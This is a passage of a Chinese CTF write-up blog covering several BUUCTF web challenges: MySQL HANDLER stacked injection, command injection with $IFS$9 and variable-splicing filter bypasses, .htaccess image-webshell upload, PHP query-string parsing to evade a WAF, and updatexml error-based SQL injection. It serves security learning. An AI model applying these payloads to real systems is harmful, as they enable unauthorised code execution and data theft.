<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">3.1 创建测试表及测试数据</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 不通过索引打开查看表</span><br><span class="line"></span><br><span class="line">打开句柄：【相当于一个指针】</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）</span><br><span class="line">通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。</span><br><span class="line"></span><br><span class="line">创建索引：</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;）</span><br><span class="line">从index为2的地方开始</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 附加：语法实例参考</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看懂以后，我自己又重新构造了一个</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure>

<p>效果一样，意思也差不多</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220731224702281.png" alt="image-20220731224702281"></p>
<h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字应该是道命令执行的题目</p>
<p>先传一个IP:123.123.123.123试试</p>
<p><code>?ip=123.123.123.123</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706231831194.png" alt="image-20220706231831194"></p>
<p>看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）</p>
<p><code>?ip=123.123.123.123;ls</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232001574.png" alt="image-20220706232001574"></p>
<p>看到flag文件，看看能不能直接读出</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232135596.png" alt="image-20220706232135596"></p>
<p>发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是</p>
<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706233818795.png" alt="image-20220706233818795"></p>
<p>意思是符号都过滤了</p>
<p>这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤</p>
<p>$IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>试试</p>
<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706234926216.png" alt="image-20220706234926216"></p>
<p>发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码</p>
<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到ip有很多正则匹配的字符，所以没有那么容易绕过</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>— 通过 <span class="keyword">shell </span>环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec 是 <span class="keyword">Shell </span>内置命令，它有两种用法，一种是执行 <span class="keyword">Shell </span>命令，一种是操作文件描述符</span><br><span class="line">ping -c <span class="built_in">Count</span> 指定要被发送（或接收）的回送信号请求的数目，由 <span class="built_in">Count</span> 变量指出</span><br><span class="line">--(所以这里我们只能输入四个字符)--</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r函数用于打印变量，以更容易理解的形式展示</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>flag过滤语句的意思判断是否按顺序出现flag</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure>

<p>所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示</p>
<p>我们看源码知道有两个变量，一个是$ip,$a</p>
<p>ip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a&#x3D;flag，就会顺序出现flag，匹配，所以试试a&#x3D;g，flag–&gt;fla$a</p>
<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>查看源码</p>
<p>得到flag</p>
<h2 id="3-MRCTF2020-你传你🐎呢"><a href="#3-MRCTF2020-你传你🐎呢" class="headerlink" title="3.[MRCTF2020]你传你🐎呢"></a>3.[MRCTF2020]你传你🐎呢</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> 看标题知道这是一个文件上传的题目，要求上传一个木马</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710111959632.png" alt="image-20220710111959632"></p>
<p>打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，修改上传的PHP的content-type为image&#x2F;png，但是还是一样的</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）</p>
<p>但是上传时，又被过滤了</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114410888.png" alt="image-20220710114410888"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114422488.png" alt="image-20220710114422488"></p>
<p>然后上传图片木马</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114444539.png" alt="image-20220710114444539"></p>
<p>把路径复制一下</p>
<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114617412.png" alt="image-20220710114617412"></p>
<p>蚁剑连接成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114647722.png" alt="image-20220710114647722"></p>
<p>在根目录发现flag</p>
<p>得到flag</p>
<h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>还是得看大佬得wp才会</p>
<p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">原文链接</a></p>
<p>这是calc.php的内容，查看源码就可以看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>waf主要就是看有没有非数字存在，绕过waf就好操作了</p>
<hr>
<p>1.1PHP的字符串解析特性</p>
<p>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。</p>
<p>例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。</p>
<p>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
<p>例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。</p>
<p>如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0–</span></span><br></pre></td></tr></table></figure>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p><u><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</strong></u></p>
<pre><code>1.删除空白符

2.将某些字符转换为下划线（包括空格）
</code></pre>
<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
</code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。</p>
<p>但php在解析的时候，会<u>先把空格给去掉</u>，这样我们的代码还能正常运行，还上传了非法字符。</p>
<hr>
<p>var_dump() </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">列举数组内容</span><br></pre></td></tr></table></figure>

<p>scandir() 的使用：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> 返回指定目录中的文件和目录的数组,就是显示文件夹名字</span><br></pre></td></tr></table></figure>

<p>file_get_contents() 的使用：</p>
<pre><code>原型：file_get_contents(path,include_path,context,start,max_length)
file_get_contents() 函数把整个文件读入一个字符串中。
和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
就是显示文件内容
</code></pre>
<hr>
<p>chr(47)是<code>/</code>的ASCII编码；【<code>/</code>就是根目录，可以先访问一下根目录，找找大概flag在哪里】</p>
<p>chr(102)是<code>f</code>的ASCII编码；</p>
<p>chr(49)是<code>1</code>的ASCII编码；</p>
<p>chr(97)是<code>a</code>的ASCII编码；</p>
<p>chr(103)是<code>g</code>的ASCII编码。</p>
<p>【字符间用<code>.</code>连接，如<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>】</p>
<p>根据php解析字符串的特性</p>
<p>先试试返回看看根目录（&#x2F;）下的文件有哪些</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(scandir(chr(47)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819232248275.png" alt="image-20220819232248275"></p>
<p>看到有个<code>flagg</code></p>
<p>返回看看<code>/flagg</code>里的内容</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819234552921.png" alt="image-20220819234552921"></p>
<h2 id="5-极客大挑战-2019-HardSQL"><a href="#5-极客大挑战-2019-HardSQL" class="headerlink" title="5.[极客大挑战 2019]HardSQL"></a>5.[极客大挑战 2019]HardSQL</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字，猜测这个sql注入过滤很严</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144626428.png" alt="image-20220821144626428"></p>
<p>先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144002573.png" alt="image-20220821144002573"></p>
<p>但是发现updatexml没有被过滤，所以可以试试报错注入</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821145036408.png" alt="image-20220821145036408"></p>
<p>先构造payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">【这里+被过滤了，所以这里用<span class="meta">#】</span></span><br></pre></td></tr></table></figure>

<p>结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure>

<p>得到数据库名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821172827984.png" alt="image-20220821172827984"></p>
<p>后面就是差不多了，但是要注意不能用空格，要用()框住对象</p>
